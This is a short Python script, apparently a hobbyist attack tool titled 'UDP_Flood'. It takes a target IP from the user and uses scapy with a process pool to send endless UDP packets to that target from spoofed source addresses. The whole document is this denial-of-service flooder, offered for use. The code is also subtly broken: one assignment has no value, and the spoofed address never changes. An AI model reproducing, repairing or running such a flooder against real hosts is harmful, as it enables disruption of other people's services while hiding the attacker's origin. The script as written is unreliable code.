import scapy.all as scapy
from multiprocessing import Pool
import os
clear = os.system('clear')
print("**************************************")
print("             UDP_Flood")
print("**************************************")
print("Please input your target's IP ")
target = input("[UDP_Flood]#")


p = {}

def UDP_Flood_End():
	print("UDP_Flood_End!")
	p.terminate()
	
def UDP_Flood(name):
	num = 
	i =1
	
	try:

		while True:
			if (i > 0) is True:
				src_ip ="123.123.125."+str(i)
			packet = scapy.IP(src=src_ip,dst = target)/scapy.UDP(sport=scapy.RandShort())
			scapy.send(packet,count=1500,verbose=False)
			num +=1
			print("Process:%s,Attack:%s"%(name,num))

	except KeyboardInterrupt:
		print("QUIT!")
	
def process():
	global p
	p = Pool(2)
	for i in range(3):
		p.apply_async(UDP_Flood,args=(i,))		
	print('Waiting for all subprocesses done...')
	p.close()
	p.join()
	print('All subprocesses done.')
	
	




